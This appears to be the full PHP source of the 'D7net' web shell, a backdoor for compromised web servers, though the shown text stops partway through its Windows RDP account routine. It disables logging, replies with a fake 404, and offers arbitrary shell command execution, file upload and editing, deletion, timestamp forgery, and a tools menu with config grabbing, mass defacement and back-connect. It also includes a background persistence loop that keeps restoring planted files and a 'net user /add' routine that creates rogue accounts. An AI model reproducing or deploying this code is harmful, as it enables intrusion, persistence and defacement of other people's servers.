<?php
error_reporting(0);
session_start();
set_time_limit(0);
@clearstatcache();
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
echo '
<!DOCTYPE html>
<html>
<head>
    <title>1#@!#!123s</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="author" content="D7net">
    <meta name="viewport" content="Kontol" />
    <meta name="description" content="Error Page">
    <meta property="og:description" content="Error Page">
    <meta property="og:image" content="#">
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noindex">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Carrois+Gothic&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Bungee+Outline&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/057b9b510c.js" crossorigin="anonymous"></script>
</head>
<body>
    
<style>
    @import url("https://fonts.googleapis.com/css?family=Dosis");
    @import url("https://fonts.googleapis.com/css?family=Carrois+Gothic");
    @import url("https://fonts.googleapis.com/css?family=Bungee+Outline");
body {
    font-family: "Dosis", cursive;
    color: #fff;
    text-shadow:0px 0px 1px #757575;
    background-color: rgb(0 0 0 / 83%);;
    background-size: cover;
    background-attachment: fixed;
    background-repeat: no-repeat;
    background-size: 7%, 7%;
    background-position: right bottom, left bottom;
}

.directory-listing-table {
  margin: auto;
  background-color: #212529;
  padding: .7rem 1rem;
  max-width: 900px;
  width: 100%;
  box-shadow: 0 0 20px black;
  border: 1px solid #fff;
}
.header {
  margin: auto;
  background-color: #212529;
  padding: .7rem 1rem;
  max-width: 100%;
  width: 100%;
  box-shadow: 0 0 20px black;
  border-bottom: 1px solid #fff;
}
th {
    border-top: 1px solid #fff;
    border-bottom: 1px solid #fff;
}
tbody td {
  font-size: 12px;
  padding: 0.5rem;
  color: #fff;
  font-weight: 400;
  font-family: "Roboto", "Poppins", sans-serif;
}
tbody td a {
    text-decoration: none;
    color: #fff;
}
tbody td:not(:first-child) {
  text-align: center;
}

body::-webkit-scrollbar {
  width: 14px;
}

body::-webkit-scrollbar-track {
  background: #000;
}

body::-webkit-scrollbar-thumb {
  background-color: #212529;
  border: 3px solid #000;
}
input { 
    margin-bottom: 4px; 
    background: rgba(0,0,0,0.3);
    border: none;
    outline: none;
    padding: 5px;
    font-size: 15px;
    color: #fff;
    text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
    border: 1px solid rgba(0,0,0,0.3);
    border-radius: 14px;
    box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
    -webkit-transition: box-shadow .5s ease;
    -moz-transition: box-shadow .5s ease;
    -o-transition: box-shadow .5s ease;
    -ms-transition: box-shadow .5s ease;
    transition: box-shadow .5s ease;
}

textarea {
    max-width: 100%;
    max-height: 100%;
    padding-left: 2px;
    resize: none;
    overflow: auto;
    color: #fff;
    text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
    border: 1px solid rgba(0,0,0,0.3);
    border-radius: 4px;
    box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
    -webkit-transition: box-shadow .5s ease;
    -moz-transition: box-shadow .5s ease;
    -o-transition: box-shadow .5s ease;
    -ms-transition: box-shadow .5s ease;
    transition: box-shadow .5s ease;
    background: rgba(0,0,0,0.3);
}
.badge-action-edit:hover::after {
            content: "Edit"
 }
        .badge-action-rename:hover::after {
            content: "Rename"
        }
        .badge-action-chmod:hover::after {
            content: "Chmod"
        }

        .badge-action-delete:hover::after {
            content: "Delete"
        }

        .badge-action-download:hover::after {
            content: "Download"
        }
        .badge-action-unzip:hover::after {
            content: "UnZip"
        }
        .badge-action-tanggal:hover::after {
            content: "ChDate"
        }
        .badge-action-unzip:hover::after,
        .badge-action-download:hover::after,
        .badge-action-delete:hover::after,
        .badge-action-chmod:hover::after,
        .badge-action-rename:hover::after,
        .badge-action-tanggal:hover::after,
        .badge-action-edit:hover::after {
            padding: 5px;
            border-radius: 10px;
            margin-left: -40px;
            color: #fff;
            border: 1px solid #fff;
            background-color: #4D4D4D;
        }
        .badge-action-unzip:hover::after,
        .badge-action-download:hover::after,
        .badge-action-delete:hover::after,
        .badge-action-chmod:hover::after,
        .badge-action-rename:hover::after,
        .badge-action-tanggal:hover::after,
        .badge-action-edit:hover::after {
            width: 68px;
            text-align: center;
            margin-top: -53px;
            display: block;
            position: absolute;
        }

textarea::-webkit-scrollbar {
  width: 12px;
}

textarea::-webkit-scrollbar-track {
  background: #000000;
}

textarea::-webkit-scrollbar-thumb {
  background-color: #212529;
  border: 3px solid black;
}

a {
    color: #fff;
    text-decoration: none;
}

a:hover {
    color: #999797;
    text-shadow:0px 0px 2 0px #ED360E;
}

input,select,textarea {
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
select {
    background-color: transparent;
    color: #ffffff;
}

select:after {
    cursor: pointer;
}
.pencet {
    background-color: rgb(0 0 0 / 57%);
    color: #fff;
    border-color: blanchedalmond;
}
.crot {
      border-radius: 50%;
      padding: 15px;
      width: 100px;
      height: 100px;
}
.d7net-text {
    font-size: 19pt;
    font-family: "Carrois Gothic", cursive;
    color: #fff;
    text-align: center;
    background: linear-gradient(200deg, #000000 25%, #ffffff 50%, #ffffff 75%, #ffffff 100%);
    background-size: 200% auto;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: animate 1.2s linear infinite; 
    }
@keyframes animate{ to { background-position: 200% center;
      }
    }
body, a, a:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), 
    default;
} 
    button:hover {
    cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
    wait;
}
    a:hover {
    cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
    wait;
}
</style>
</td>
<script>
function myFunction() {
  var copyText = document.getElementById("myInput");
  copyText.select();
  copyText.setSelectionRange(0, 99999); // For mobile devices
  navigator.clipboard.writeText(copyText.value);
  alert("Copied Successfully!!");
}
</script>';
@http_response_code(404);
$web = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://".$_SERVER['HTTP_HOST'];
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
    $disf = "<font color='lime'>AMAN</font>";
} else {
    $disf = "<font color='red'>".$disfunc."</font>";
}
function author() {
    echo "</div><table class='directory-listing-table'><thead><td><center><font face=\"dosis\" size=\"4px\">D7NET &copy; 2017</center></td></thead></table><br>";
    exit();
}

function cekdir() {
    if (isset($_GET['path'])) {
        $serlok = $_GET['path'];
    } else {
        $serlok = getcwd();
    }
    if (is_writable($serlok)) {
        return "<font color='lime'>Aman Coy</font>";
    } else {
        return "<font color='red'>KONTOL!</font>";
    }
}

function cekroot() {
    if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
        return "<font color='lime'>Aman Coy</font>";
    } else {
        return "<font color='red'>KONTOL!</font>";
    }
}
function d7net_ex($file) {
    $pile = $file;
    $pch = pathinfo($pile, PATHINFO_FILENAME);
    return $pch;
}

function xrmdir($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}

function owner($file) {
    if (function_exists("posix_getpwuid")) {
        $tod = @posix_getpwuid(fileowner($file));
        return "<center>".$tod['name']."</center>";
    } else {
        return "<center>".fileowner($file)."</center>";
    }
}

function cekwrite($serlok) {
    $izin = substr(sprintf('%o', fileperms($serlok)), -4);
    if (is_writable($serlok)) {
        return "<font color=lime>".$izin."</font>";
    } else {
        return "<font color=red>".$izin."</font>";
    }
}
function cmd($gas, $serlok) {
    $ler = "2>&1";
    if (!preg_match("/".$ler."/i", $gas)) {
        $gas = $gas." ".$ler;
    }

    $crot = $gas;
    $pr = "proc_open";
    if (function_exists($pr)) {
    $tod = @proc_open($crot, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $serlok);
    echo "".stream_get_contents($crottz[1])."</textarea></center><br>";
    } else {
        echo "<font color='orange'>proc_open function is disabled!!</font>";
    }
}
function ekse($coman, $serlok) {
    $ler = "2>&1";
    if (!preg_match("/".$ler."/i", $coman)) {
        $coman = $coman." ".$ler;
    }
    $komen = $coman;
    $pr = "proc_open";
    if (function_exists($pr)) {
    $tod = @proc_open($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $serlok);
    echo "<pre><textarea rows='25' style='color:lime;' readonly='' cols='120px'>
    ".htmlspecialchars(stream_get_contents($crottz[1]))."</textarea></pre><br>";
    } else {
        echo "<font color='orange'>proc_open function is disabled!!</font>";
    }
}
function ipserv() {
    if (empty($_SERVER['SERVER_ADDR'])) {
        return gethostbyname($_SERVER['SERVER_NAME']);
        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
            return $_SERVER['SERVER_NAME'];
        }
    } else {
        return $_SERVER['SERVER_ADDR'];
    }
}

function cekfile($file) {
     return '<img src="https://cdn-icons-png.flaticon.com/128/2702/2702619.png" style="height:17px;">';
}
    
function filedate($file) {
    return date("F d Y g:i:s", filemtime($file));
}

function unzip($file, $serlok) {
    if (!is_readable($file)) {
        red("<table class='directory-listing-table' style='color:orange;'><thead><td><font color='orange'>Cannot Unzip File / Unreadable File !</font></td></thead></table>");
        die();
    } elseif (strpos(file_get_contents($file), "\x50\x4b\x03\x04") === false) {
        echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> This isn't Zip File</center></font></td></table>";
        die();
    }
    $zip = new ZipArchive;
    $res = $zip -> open($file);
    if ($res == true) {
        $zip -> extractTo($serlok);
        $zip -> close();
        lime("<table class='directory-listing-table' style='border-color:lime;'> <td>Success Unzip File => <font color='lime'>".basename($_POST['path'])."</font></td></thead</table>");
    } else {
        red("<table class='directory-listing-table' style='border-color:red;'><td><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to Unzip File!!</font></td></table>");
    }
    exit();
}

function lime($text) {
    echo "<center><font color='lime'>".$text."</center></font>";
}

function red($text) {
    echo "<center><font color='red'>".$text."</center></font>";
}

foreach($_POST as $key => $value){
    $_POST[$key] = stripslashes($value);
}

if(isset($_GET['path'])){
    $serlok = $_GET['path'];
    $serlok2 = $_GET['path'];
} else {
    $serlok = getcwd();
    $serlok2 = getcwd();
}

$serlok = str_replace('\\','/',$serlok);
$serloks = explode('/',$serlok);
$serlokbos = @scandir($serlok);


echo '<table class="header" align="center"><td>
    <div style="font-family:Bungee Outline;font-size:24px;float:left;"><i class="fa-brands fa-napster"></i> D7net</div></td><td>';
echo '
<table align="center"><td>
<div class="btn-group me-2" role="group" aria-label="First group">
<button type="button" onclick=location.href="'.$_SERVER['SCRIPT_NAME'].'" class="btn btn-outline-light"><font color="aqua"><i class="fa fa-home"></i> Home</font></button>

<div class="btn-group me-2" role="group" aria-label="First group">
<button type="button" onclick=location.href="?path='.$serlok.'&cmd=opet" class="btn btn-outline-light"><i class="fa fa-terminal"></i> Console</button>

<button type="button" onclick=location.href="?path='.$serlok.'&upload=opet" class="btn btn-outline-light"><i class="fa fa-upload"></i> Upload</button>

<button type="button" class="btn btn-outline-light"onclick=location.href="?path='.$serlok.'&info=opet"><i class="fa fa-info-circle"></i> information</button>

<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&buatfile=opet"><i class="fa-solid fa-file-circle-plus"></i> Create file</button>

<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&buatfolder=opet" style="float: right;"><i class="fa-solid fa-folder-plus"></i> Create Folder</button>

<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&about=opet" style="float: right;"><i class="fa-solid fa-circle-info"></i> About</button>

<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&tool=opet"><i class="fa fa-wrench"></i> Tools</button>
</td></tr></div></div></td></table></table><br>';
echo '<table class="directory-listing-table"><td>Path : ';
foreach($serloks as $id => $lok){
    if($lok == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a></center>';
        continue;
    }
    if($lok == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
    echo "$serloks[$i]";
    if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}
echo '</td></thead></table><br>';
    if (isset($_GET['logout'])) {
        session_start();
        session_destroy();
        echo '<br><script>window.location="?";</script>';
    }

if (isset($_GET['viewfile'])) {
    $files = basename($_GET['viewfile']);
    echo "</tr></td></table></center><table class='directory-listing-table'><td><center>Filename : <font color='orange'>$files</font>";
    echo "<form method='post' action='?pilihan&path=$serlok'>";
    echo "<table width='20%' border='0' cellpadding='0' cellspacing='0' align='center'><td>
    <div class='btn-group me-2' role='group' aria-label='First group'>
    <button onclick=location.href='?path=$serlok' class='btn btn-outline-light'><i class='fa fa-arrow-left'></i> back</button>
    <button type='submit' class='btn btn-outline-light' name='pilih' value='edit'><i class='fa fa-pencil'></i> Edit</button>
    <button type='button' class='btn btn-outline-light' onclick='myFunction()'><i class='fa fa-copy'></i> Copy</button></div><br><br>";
    echo "<input type='hidden' name='type' value='file'>
    <input type='hidden' name='name' value='$files'>
    <input type='hidden' name='path' value='$serlok/$files'>";
    echo "<textarea readonly='' cols=120 rows=30 id='myInput'>".htmlspecialchars(file_get_contents($_GET['viewfile']))."</textarea></td></table></table><br>";
    exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
    if (is_dir($_POST['path'])) {
        xrmdir($_POST['path']);
        if (file_exists($_POST['path'])) {
            echo '<table class="directory-listing-table" style="border-color:red;"><td><center><font color="red"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Failed to delete Directory</font></center></td></table>';
        } else {
            echo '<table class="directory-listing-table" style="border-color:lime;"><td><center><font color="lime">Delete Directory Success !</font></center></td></table>';
        }
    } elseif (is_file($_POST['path'])) {
        @unlink($_POST['path']);
        if (file_exists($_POST['path'])) {
            echo "<table class='directory-listing-table' style='border-color:red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to Delete File</font></center></td></table>";
        } else {
            echo "<table class='directory-listing-table' style='border-color:lime;'><td><center>Delete File <font color=orange>".basename($_POST['path'])."</font> Success !</center></td></table>";
        }
    }
    exit();    
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
    if (isset($_POST['gantin'])) {
        $namabaru = $_GET['path']."/".$_POST['newname'];
        if (@rename($_POST['path'], $namabaru) === true) {
            echo "<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Change Name Success<center></td></table><br>";
            if ($_POST['type'] == "file") {
                echo "<table class='directory-listing-table'><td><center>Filename : <font color='orange'>".basename($_POST['newname'])."</font><br><br>";
            } else {
                echo "<table class='directory-listing-table'><td><center><center>Folder : <font color='orange'>".basename($_POST['newname'])."</font><br>";
            }
            echo '<form method="post">
            <div class="input-group mb-1" style="width:300px;">
            <input name="newname" type="text" class="form-control" size="20" placeholder="New name" />
            <input type="hidden" name="path" value="'.$_POST['newname'].'">
            <input type="hidden" name="pilih" value="gantinama">';
            if ($_POST['type'] == "file") {
                echo '<input type="hidden" name="type" value="file">';
            } else {
                echo '<input type="hidden" name="type" value="dir">';
            }
            echo '<input type="submit" value="Change" name="gantin" class="btn btn-outline-light mb-1">
            </div></form></td></table>';
        } else {
            echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> FAILED TO CHANGE NAME</font></center></td></table>";
        }
    } else {
        if ($_POST['type'] == "file") {
            echo "<table class='directory-listing-table'><td><center>Filename <font color='orange'>: ".basename($_POST['path'], $_GET['file'])."</font><br><br>";
        } else {
            echo "<table class='directory-listing-table'><td><center>Folder <font color='orange'>: ".basename($_POST['path'])."</font><br><br>";
        }
        echo '
        <form method="post">
        <div class="input-group mb-1" style="width:300px;">
        <input name="newname" type="text" class="form-control" size="20" placeholder="New name" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="pilih" value="gantinama">';
        if ($_POST['type'] == "file") {
            echo '<input type="hidden" name="type" value="file">';
        } else {
            echo '<input type="hidden" name="type" value="dir">';
        }
        echo '<input type="submit" value="Change" name="gantin" class="btn btn-outline-light mb-1"/>
        </div></form></td></table><br>';
    } exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
    if (isset($_POST['gasedit'])) {
        $edit = file_put_contents($_POST['path'], $_POST['src']);
        if ($edit == true) {
            echo "<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>File saved Successfully</font></center></td></table><br>";
        } else {
            echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Can't save file/Permission Denied</font></center></td></table><br>";
        }
    }
    echo "<center><table class='directory-listing-table'><td><center> Filename : <font color='orange'>".basename($_POST['path'])."</font><br><br>";
    echo '<form method="post">
    <div class="btn-group me-2" role="group" aria-label="First group">
    <a href="?path='.$serlok.'" class="btn btn-outline-light"><i class="fa fa-arrow-left"></i> back</a>
    <button type="submit" name="gasedit" class="btn btn-outline-light"style="width:250px;">
    <i class="fa fa-save"></i> Save</button>
    <button type="button" class="btn btn-outline-light" onclick="myFunction()"><i class="fa fa-copy"></i> Copy</button></div><br><br>
    <textarea type="text" cols=120 id="myInput" rows=30 name="src">'.htmlspecialchars(@file_get_contents($_POST['path'])).'</textarea><br>
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="edit">
    </form><br></td></thead></table><br>'; exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "chdatef") {
    $filedate = basename($_POST['path']);
      $tgl = date("F d Y g:i:s", filemtime($_POST['path']));
          echo "<table class='directory-listing-table'><td>
          <form method='post'><center>
          <font color='#fff'>Ubah Tanggal<br>Folder :</font> <font color='orange'>$filedate</font> 
          <br>$tgl<br><br><div class='input-group mb-3' style='width:280px;'>         
          <input name='tanggal' type='text' class='form-control' value='".$_POST['tanggal']."' placeholder='$tgl'/>
          <input type='hidden' name='path' value='".$_POST['path']."'>
          <input type='hidden' name='pilih' value='chdatef'>
          <button type='submit' class='btn btn-outline-light mb-1' name='change' value='change'>Change</button></div></form></center></td></table>";
          if (isset($_POST['change'])) {
        $tanggal = strtotime($_POST['tanggal']);
        if (@touch($_POST['path'], $tanggal) == true) {
          echo "<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'><center>Changed Successfully!!</font></center></td></table>";
        } else {
          echo "<br><table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to change date!!</td></table>";
        }
      }exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "chdate") {
    $filedate = basename($_POST['path']);
      $tgl = date("F d Y g:i:s", filemtime($_POST['path']));
          echo "<table class='directory-listing-table'><td>
          <form method='post'><center><font color='#fff'>Ubah Tanggal<br>File :</font> <font color='orange'>$filedate <br></font>$tgl
          <br><br><div class='input-group mb-3' style='width:280px;'>
          <input name='tanggal' type='text' class='form-control' value='".$_POST['tanggal']."' placeholder='$tgl'/>
          <input type='hidden' name='path' value='".$_POST['path']."'>
          <input type='hidden' name='pilih' value='chdate'>
          <button type='submit' class='btn btn-outline-light mb-1' name='change' value='change'>Change</button>
          </div></form></center></td></table>";
          if (isset($_POST['change'])) {
        $tanggal = strtotime($_POST['tanggal']);
        if (@touch($_POST['path'], $tanggal) == true) {
          echo "<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'><center>Changed Successfully!!</font></center></td></table>";
        } else {
          echo "<br><table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to change date!!</td></table>";
        }
      }exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "chmodf") {
    $files = basename($_POST['path']);
    $sbr = 'substr';
    $spr = 'sprintf';
    $flperm = 'fileperms';
      echo "<table class='directory-listing-table'><td>
      <br><center> <font color='#fff'>Folder : <font color='orange'>$files</font> (".$sbr($spr('%o',$flperm($_POST['path'])), -4).")<br><br>
      <form method='post'>
      <div class='input-group mb-3' style='width:230px;'>
    <input type='text' name='mod1' class='form-control' height='10' value='".$_POST['mod1']."' placeholder='0755' required/> 
    <input type='hidden' name='path' value='".$_POST['path']."'>
    <input type='hidden' name='pilih' value='chmodf'>
    <button type='submit' class='btn btn-outline-light mb-1' name='ganti' value='ganti'>Change</button>
    </div></form></td></table>";
    if (isset($_POST['ganti'])) {
      $opet = @chmod($_POST['path'], octdec($_POST['mod1']));
    if ($opet == true) {
        echo "<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Changed Successfully!!</font></center></td></table>";
        } else {
            echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to change!!</font></center></td></table>";
        }
      }exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "chmod") {
    $files = basename($_POST['path']);
    $sbr = 'substr';
    $spr = 'sprintf';
    $flperm = 'fileperms';
      echo "<table class='directory-listing-table'><td>
      <center><font color='#fff'>Filename : <font color='orange'>$files</font> (".$sbr($spr('%o',$flperm($_POST['path'])), -4).")<br><br>
      <form method='post'>
      <div class='input-group mb-3' style='width:230px;'>
    <input type='text' name='mod1' class='form-control' height='10' value='".$_POST['mod1']."' placeholder='0644' required/> 
    <input type='hidden' name='path' value='".$_POST['path']."'>
    <input type='hidden' name='pilih' value='chmod'>
    <br><br><button type='submit' class='btn btn-outline-light mb-1' name='ganti' value='ganti'>Change</button></div>
    </form></td></table>";
    if (isset($_POST['ganti'])) {
      $opet = @chmod($_POST['path'], octdec($_POST['mod1']));
    if ($opet == true) {
        echo "<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Changed Successfully!!</font></center></td></table>";
        } else {
            echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to change!!</font></center></td></table>";
        }
      }exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
    unzip($_POST['path'], $serlok);

} elseif ($_REQUEST['upload'] == "opet") {
    echo "<table class='directory-listing-table'><td><center>
    <form method='POST' enctype='multipart/form-data' id='upload'><h5><i class='fa fa-upload'></i> UPLOAD FILES<h5>
    <div class='input-group' style='width:360px;'>
    <input type='file' name='d7netfile' id='d7net' style='background-color: grey;' class='form-control' name='uplod'>
    <input type='submit' class='btn btn-outline-light' for='inputGroupFile02' name='uplod' value='Upload'></div>
              </form></center></td></table>";
     if (isset($_POST['uplod'])) {
        if ($_POST['dirnya'] == "2") {
            $serlok = $_SERVER['DOCUMENT_ROOT'];
        }
        if (empty($_FILES['d7netfile']['name'])) {
            echo "<br><table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> File not selected</center></font>";
        } else {
            $data = @file_put_contents($serlok."/".$_FILES['d7netfile']['name'], @file_get_contents($_FILES['d7netfile']['tmp_name']));
                if (file_exists($serlok."/".$_FILES['d7netfile']['name'])) {
                    $fl = $serlok."/".$_FILES['d7netfile']['name'];
                    echo "<br><table class='directory-listing-table' style='border-color:lime;'><td>
                    Uploaded => <font color='lime'><i>".$_FILES['d7netfile']['name']."</i></font><br>";
                    if (strpos($serlok, $_SERVER['DOCUMENT_ROOT']) !== false) {
                        $lwb = str_replace($_SERVER['DOCUMENT_ROOT'], $web."/", $fl);
                        echo "Link : <a href='".$lwb."' target='_blank'><font color='lime'>Click here</font></a></td></table><br>";
                    }
                    echo "<br>";
                } else {
                    echo "<br><table class='directory-listing-table' style='border-color:red;'><td><font color='red'>Failed to upload!!</font></td></table>";
            }
        }
    }exit(); 

 } elseif ($_GET['tool'] == "opet") {
echo '<table class="directory-listing-table"><thead><td><center><font color=orange>Select Tools</font><hr>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&grab_config=opet">Grab Config</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&scanuid=opet">Scan sUID</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&ner=opet">Adminer</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&massdef=opet">Mass Deface</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&backcon=opet">Back Connect</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&lokfile=opet">Lock File</button>
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&addrdp=opet">Create RDP</button><hr>&nbsp;';
        exit();
} elseif ($_GET['cmd'] == "opet") {
    echo "<table class='directory-listing-table'><td>";
    echo '<br><form method="post"><center>
    <div class="input-group" style="width:600px;">
    <span class="input-group-text mb-1">Command :</span>
     <input type="text" class="form-control" name="komen" id="comandnya" value="'.$_POST['komen'].'" placeholder="uname -a" required>
    <button type="submit" name="comandeks" value="execute" class="btn btn-outline-light mb-1">>></button></div></form><br><center>';
    if (isset($_POST['comandeks'])) {
        ekse($_POST['komen'], $serlok);
    }
    echo "</center></td></table><br></center>";
    exit();
} elseif ($_REQUEST['about'] == "opet") {
    echo "<table class='directory-listing-table'><thead><td><div style='font-family: Bungee Outline;font-size:24px;'>
    <img class='crot' src='https://i.pinimg.com/564x/84/0e/4c/840e4c57fab2ba6279b377ae8dc333d3.jpg'/> Priv shell uwu edition</div><hr>
    <br> - D7net shell 2.1 <br> - Created by D7net</td></thead></table>"; exit();
} elseif ($_REQUEST['lokfile'] == "opet") {
    echo "<table class='directory-listing-table'><td>
    <form method='post'>
    <h5><i class='fa fa-lock' aria-hidden='true'></i> Lock file<font class='d7net-text' style='font-size:12px;'><i> Linux</i></font></h5><hr>
    <div class='input-group mb-2' style='width:280px;'>
    <input type='text' name='pile' class='form-control' placeholder='file.php' required/>
    <input type='submit' name='submit' class='btn btn-outline-light'></div></form></td></table>";
    if (isset($_POST['submit'])) {
        $filez = $_POST['pile'];
        $tempe = "/tmp";
        if (file_exists($tempe.'/'.md5($serlok. $filez.'-xd7net').d7net_ex($filez).'xhand.Lock') && file_exists($tempe . '/'.d7net_ex($filez).'-xopet')) {
            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xopet').d7net_ex($filez).'xd7net.Lock', $serlok);
            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xd7net').d7net_ex($filez).'xhand.Lock', $serlok);
            }
            cmd("cp $filez ".$tempe."/".md5($serlok. $filez.'-xopet').d7net_ex($filez).'xd7net.Lock', $serlok);
            @chmod($filez, 0444);
            $content = '<?php
    $tmp = "/tmp";
    $fileperm = d7net_perm("'.$filez.'");
    d7net_cmd("chmod 444 '.$filez.'");
    while (True) {
        if (!file_exists("'.$filez.'")) {
            $var = base64_encode(file_get_contents($tmp . "/'.md5($serlok. $filez.'-xopet').d7net_ex($filez).'xd7net.Lock"));
            FiLe_pUt_ConTentS("'.$filez.'", base64_decode($var));
        }
        if ($fileperm != "0444"){
            d7net_cmd("chmod 444 '.$filez.'");
        }
    }
    function d7net_cmd($value)
    {
        if (function_exists("system")) {
            sYsTem($value);
        } else if (function_exists("shell_exec")) {
            return ShEll_eXeC($value);
        } else if (function_exists("exec")) {
            return ExEc($value);
        } else if (function_exists("passthru")) {
            return pAsSThRu($value);
        }
    }
    function d7net_perm($filez){
        return substr(sprintf("%o", fileperms($filez)), -4);
    }';
    $content = file_put_contents($tempe. "/" .md5($serlok. $filez.'-xd7net'). d7net_ex($filez).'xhand.Lock', $content);
    if ($content) {
        echo "<table class='directory-listing-table' style='border-color:lime;'><td>Locked => <font color='lime'>$filez</font></td></table>";
        cmd('php '. $tempe . '/' .md5($serlok. $filez.'-xd7net').d7net_ex($filez).'"xhand.Lock" > /dev/null 2>/dev/null &', $serlok);
    } else {
        echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to lock File $filez</font></td></table>";
        }
    }exit();
} elseif ($_GET['addrdp'] == "opet") {
    echo "<table class='directory-listing-table'><td>
    <h5><i class='fas fa-laptop-house'></i> Create RDP<font class='d7net-text' style='font-size:12px;'><i>windows</i></font></h5>";
    echo '<hr><form method="post">
    <div style="width:270px;">
    <input type="text" class="form-control" name="user" value="'.$_POST['user'].'" placeholder="username" required></div>
    <div class="input-group" style="width:270px;">
    <input type="text" class="form-control" name="pass" value="'.$_POST['pass'].'" placeholder="password" required>
    <button type="submit" name="creates" class="btn btn-outline-light mb-1">create</button></div></form><br>';
    if (isset($_POST['creates'])) {
        $userRDP = $_POST['user'];
        $passRDP = $_POST['pass'];
        if (stristr(PHP_OS, "WIN")) {
            $procRDP = cmd("net user " . $userRDP . " " . $passRDP . " /add", $serlok);
